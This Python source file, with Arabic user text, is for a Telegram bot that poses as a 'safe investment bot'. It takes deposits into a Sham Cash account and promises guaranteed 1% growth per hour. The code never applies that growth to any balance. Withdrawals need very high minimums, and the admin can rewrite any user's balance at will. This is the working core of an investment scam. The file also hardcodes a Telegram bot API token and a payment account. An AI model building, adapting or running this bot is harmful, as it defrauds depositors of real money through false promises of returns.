import telebot
from telebot import types
import datetime
import json
import os
import re
import time

# --- [ الإعدادات الأساسية ] ---
API_TOKEN = '8267414994:AAF90rW-HzXCfy3UJtOx2vtaSYHzOVRSqzI'
DATA_FILE = 'user_data.json'
ADMIN_USER_IDS = [6721668379] 
SHAM_CASH_ACCOUNT = "16411f4c1d9fdefd7835ac7169a37e6d" # حساب شام كاش الخاص بك
HOURLY_GROWTH_RATE = 1.01 

# --- [ حدود السحب الدنيا ] ---
WITHDRAW_LIMITS = {
    'SYP': 5000000.0,
    'USD': 500.0,
    'EUR': 400.0
}

# --- [ حالات المستخدم ] ---
STATE_DEFAULT = 'default'
STATE_AWAITING_AMOUNT = 'awaiting_amount'
STATE_AWAITING_PROOF = 'awaiting_proof'
STATE_AWAITING_WITHDRAW_AMOUNT = 'awaiting_withdraw_amount'
STATE_AWAITING_WITHDRAW_ACC = 'awaiting_withdraw_account'
STATE_ADMIN_BROADCAST = 'admin_broadcast'
STATE_ADMIN_SET_ID = 'admin_set_id'
STATE_ADMIN_SET_AMT = 'admin_set_amt'

CURRENCIES = {'SYP': 'ليرة سورية', 'USD': 'دولار أمريكي', 'EUR': 'يورو'}

# --- [ إدارة البيانات ] ---
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try:
                data = json.load(f)
                new_data = {}
                for k, v in data.items():
                    if str(k).isdigit():
                        uid = int(k)
                        v.setdefault('balances', {'SYP': 0.0, 'USD': 0.0, 'EUR': 0.0})
                        v.setdefault('history', [])
                        v.setdefault('state', STATE_DEFAULT)
                        v.setdefault('is_deposited', False)
                        new_data[uid] = v
                return new_data
            except: return {}
    return {}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump({str(k): v for k, v in data.items()}, f, indent=4)

user_data = load_data()
bot = telebot.TeleBot(API_TOKEN)

# --- [ لوحات المفاتيح ] ---
def get_main_keyboard(uid):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("🚀 إيداع جديد", "💰 رصيدي")
    markup.add("💸 طلب سحب", "📝 سجل العمليات")
    markup.add("📊 تفاصيل الحساب")
    if uid in ADMIN_USER_IDS:
        markup.add("⚙️ لوحة المشرف")
    return markup

def get_admin_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 إذاعة (رسالة للكل)", callback_data="adm_broadcast"))
    markup.add(types.InlineKeyboardButton("💰 تعديل رصيد مستخدم", callback_data="adm_edit_bal"))
    markup.add(types.InlineKeyboardButton("👥 إحصائيات", callback_data="adm_stats"))
    return markup

# --- [ الأوامر ] ---
@bot.message_handler(commands=['start'])

def start(message):
    uid = message.chat.id
    
    first_name= message.from_user.first_name
    if uid not in user_data:
        user_data[uid] = {
            'state': STATE_DEFAULT, 'is_deposited': False,
            'balances': {'SYP': 0.0, 'USD': 0.0, 'EUR': 0.0},
            'history': [], 'last_update': datetime.datetime.now().isoformat()
        }
    user_data[uid]['state'] = STATE_DEFAULT
    save_data(user_data)
    bot.send_message  (uid,f"👋 أهلاً بك يا **{first_name}** في بوت الاستثمار الآمن!.\n"
        f"هذا البوت يتيح لك الإيداع في الشام كاش والاستفادة من  سريع وآمن.\n"
        "\n"
        "--- لماذا تختار بوتنا؟ ---\n"
        "✅ الثقة والأمان أموالك مودعة في حسابات موثوقة ومحمية.\n"
        f"💰 نمو مضمون رصيدك ينمو بمعدل {(HOURLY_GROWTH_RATE - 1) * 100:.0f}% كل ساعة** دون توقف! 📈\n"
        "⏰ الشفافية يمكنك متابعة رصيدك ونموه في أي لحظة.\n"
        f"💸 السحب الحد الأدنى للسحب هو:5,000,000 ليرة.\n500 دولار\n400يورو"
        "\n"
        "ابدء بعملية الإيداع الان"
        "\n"
        "يرجى استخدام القائمة أدناه للتحكم بحسابك"
    )
    
# --- [ معالجة الـ Callback ] ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    admin_id = call.from_user.id
    data = call.data
    try: bot.answer_callback_query(call.id)
    except: pass

    if data == "adm_broadcast" and admin_id in ADMIN_USER_IDS:
        user_data[admin_id]['state'] = STATE_ADMIN_BROADCAST
        bot.send_message(admin_id, "أرسل الرسالة التي تريد نشرها:")
        
    elif data == "adm_edit_bal" and admin_id in ADMIN_USER_IDS:
        user_data[admin_id]['state'] = STATE_ADMIN_SET_ID
        bot.send_message(admin_id, "أرسل معرف (ID) المستخدم:")

    elif data == "adm_stats" and admin_id in ADMIN_USER_IDS:
        bot.send_message(admin_id, f"👥 إجمالي المستخدمين: {len(user_data)}")

    elif data.startswith('ok_d_'):
        tid = int(data.split('_')[2])
        if tid in user_data:
            u = user_data[tid]
            amt, curr = u.get('pending_deposit', 0), u.get('pending_curr', 'SYP')
            u['balances'][curr] += amt
            u['is_deposited'] = True
            u['history'].append(f"✅ إيداع: {amt} {curr} ({datetime.datetime.now().strftime('%H:%M')})")
            save_data(user_data)
            bot.send_message(tid, f"✅ تم تفعيل إيداعك بقيمة {amt} {curr}")
            bot.edit_message_caption("✅ تم القبول", call.message.chat.id, call.message.message_id)

    elif data.startswith('no_d_'):
        tid = int(data.split('_')[2])
        bot.send_message(tid, "❌ تم رفض إثبات الإيداع الخاص بك.")
        bot.edit_message_caption("❌ تم الرفض", call.message.chat.id, call.message.message_id)

    elif data.startswith('ok_w_'):
        parts = data.split('_')
        tid, amt = int(parts[2]), float(parts[3])
        if tid in user_data:
            curr = user_data[tid].get('withdraw_curr', 'SYP')
            user_data[tid]['balances'][curr] -= amt
            user_data[tid]['history'].append(f"💸 سحب: {amt} {curr} ({datetime.datetime.now().strftime('%H:%M')})")
            save_data(user_data)
            bot.send_message(tid, f"✅ تم تحويل مبلغ السحب: {amt} {curr}")
            bot.edit_message_text("✅ تم تأكيد السحب", call.message.chat.id, call.message.message_id)

    elif data.startswith('wdc_'):
        curr = data.split('_')[1]
        user_data[call.message.chat.id]['withdraw_curr'] = curr
        user_data[call.message.chat.id]['state'] = STATE_AWAITING_WITHDRAW_AMOUNT
        bot.send_message(call.message.chat.id, f"أدخل مبلغ السحب (الأدنى {WITHDRAW_LIMITS[curr]} {curr}):")

    elif data.startswith('dep_'):
        curr = data.split('_')[1]
        user_data[call.message.chat.id]['pending_curr'] = curr
        user_data[call.message.chat.id]['state'] = STATE_AWAITING_AMOUNT
        bot.send_message(call.message.chat.id, f"أدخل مبلغ الإيداع بالـ {CURRENCIES[curr]}:")

# --- [ معالجة النصوص ] ---
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    uid = message.chat.id
    u = user_data.get(uid)
    if not u: return

    # --- [ منطق الإيداع مع شام كاش ] ---
    if u['state'] == STATE_AWAITING_AMOUNT:
        try:
            amt = float(re.sub(r'[^\d.]', '', message.text))
            u['pending_deposit'] = amt
            u['state'] = STATE_AWAITING_PROOF
            msg = (
                f"📝 **معلومات الإيداع:**\n\n"
                f"يرجى تحويل مبلغ `{amt}` {u.get('pending_curr')} إلى حساب **شام كاش** التالي:\n"
                f"💳 رقم الحساب: `{SHAM_CASH_ACCOUNT}`\n\n"
                f"⚠️ بعد إتمام التحويل، يرجى إرسال **صورة إثبات التحويل** (Screenshot) هنا."
            )
            bot.send_message(uid, msg, parse_mode='Markdown')
            save_data(user_data)
        except:
            bot.send_message(uid, "يرجى إدخال مبلغ صحيح.")

    # --- [ منطق المشرف ] ---
    elif u['state'] == STATE_ADMIN_BROADCAST and uid in ADMIN_USER_IDS:
        for user_id in user_data:
            try: bot.send_message(user_id, f"📢 رسالة إدارية:\n\n{message.text}")
            except: pass
        u['state'] = STATE_DEFAULT
        bot.send_message(uid, "✅ تم النشر للجميع.")

    elif u['state'] == STATE_ADMIN_SET_ID and uid in ADMIN_USER_IDS:
        target_id = int(re.sub(r'\D', '', message.text))
        if target_id in user_data:
            u['target_edit'] = target_id
            u['state'] = STATE_ADMIN_SET_AMT
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            markup.add("USD", "EUR", "SYP", "إلغاء")
            bot.send_message(uid, "اختر العملة لتعديل رصيد المستخدم:", reply_markup=markup)
        else: bot.send_message(uid, "❌ المستخدم غير موجود.")

    elif u['state'] == STATE_ADMIN_SET_AMT and uid in ADMIN_USER_IDS:
        if message.text in CURRENCIES:
            u['target_curr'] = message.text
            bot.send_message(uid, f"أدخل الرصيد الجديد لـ {message.text}:")
        elif message.text == "إلغاء":
            u['state'] = STATE_DEFAULT
            bot.send_message(uid, "تم الإلغاء.", reply_markup=get_main_keyboard(uid))
        else:
            try:
                new_bal = float(message.text)
                user_data[u['target_edit']]['balances'][u['target_curr']] = new_bal
                save_data(user_data)
                u['state'] = STATE_DEFAULT
                bot.send_message(uid, f"✅ تم التحديث بنجاح.", reply_markup=get_main_keyboard(uid))
            except: bot.send_message(uid, "أدخل رقم رصيد صحيح.")

    # --- [ الأزرار الرئيسية ] ---
    elif message.text == "⚙️ لوحة المشرف" and uid in ADMIN_USER_IDS:
        bot.send_message(uid, "لوحة التحكم:", reply_markup=get_admin_keyboard())

    elif message.text == "💰 رصيدي":
        bal = "\n".join([f"• {CURRENCIES[c]}: `{v:.2f}`" for c, v in u['balances'].items()])
        bot.send_message(uid, f"💳 **أرصدتك:**\n{bal}", parse_mode='Markdown')

    elif message.text == "🚀 إيداع جديد":
        markup = types.InlineKeyboardMarkup()
        for c in CURRENCIES: markup.add(types.InlineKeyboardButton(CURRENCIES[c], callback_data=f"dep_{c}"))
        bot.send_message(uid, "اختر عملة الإيداع:", reply_markup=markup)

    elif message.text == "💸 طلب سحب":
        markup = types.InlineKeyboardMarkup()
        for c in CURRENCIES: markup.add(types.InlineKeyboardButton(CURRENCIES[c], callback_data=f"wdc_{c}"))
        bot.send_message(uid, "اختر العملة للسحب:", reply_markup=markup)

    elif u['state'] == STATE_AWAITING_WITHDRAW_AMOUNT:
        amt = float(re.sub(r'[^\d.]', '', message.text))
        curr = u['withdraw_curr']
        if amt < WITHDRAW_LIMITS[curr]: bot.send_message(uid, f"❌ الحد الأدنى {WITHDRAW_LIMITS[curr]}")
        elif amt > u['balances'][curr]: bot.send_message(uid, "❌ رصيدك غير كافٍ.")
        else:
            u['pending_withdraw_amt'] = amt
            u['state'] = STATE_AWAITING_WITHDRAW_ACC
            bot.send_message(uid, "أدخل رقم حسابك لاستلام الأموال:")
        save_data(user_data)

    elif u['state'] == STATE_AWAITING_WITHDRAW_ACC:
        acc = message.text
        amt, curr = u['pending_withdraw_amt'], u['withdraw_curr']
        u['state'] = STATE_DEFAULT
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ تأكيد", callback_data=f"ok_w_{uid}_{amt}"),
                   types.InlineKeyboardButton("❌ رفض", callback_data=f"no_w_{uid}"))
        bot.send_message(ADMIN_USER_IDS[0], f"💸 طلب سحب:\nالمبلغ: {amt} {curr}\nالحساب: {acc}\nID: {uid}", reply_markup=markup)
        bot.send_message(uid, "✅ تم إرسال طلب السحب للمراجعة.")
        save_data(user_data)

    elif message.text == "📊 تفاصيل الحساب":
        bot.send_message(uid, f"📊 **تفاصيل:**\nنمو تلقائي 1% ساعة.\nمعرفك: `{uid}`", parse_mode='Markdown')

    elif message.text == "📝 سجل العمليات":
        bot.send_message(uid, "📋 **السجل:**\n" + ("\n".join(u['history'][-10:]) if u['history'] else "لا يوجد عمليات."))

# --- [ معالجة الصور ] ---
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    uid = message.chat.id
    u = user_data.get(uid)
    if u and u['state'] == STATE_AWAITING_PROOF:
        u['state'] = STATE_DEFAULT
        save_data(user_data)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ قبول", callback_data=f"ok_d_{uid}"),
                   types.InlineKeyboardButton("❌ رفض", callback_data=f"no_d_{uid}"))
        bot.send_photo(ADMIN_USER_IDS[0], message.photo[-1].file_id, 
                       caption=f"🚨 إيداع: {u['pending_deposit']} {u['pending_curr']}\nID: {uid}", reply_markup=markup)
        bot.send_message(uid, "⏳ تم إرسال الإثبات للمراجعة.")

if __name__ == '__main__':
    print("البوت يعمل بنجاح...")
    bot.infinity_polling()
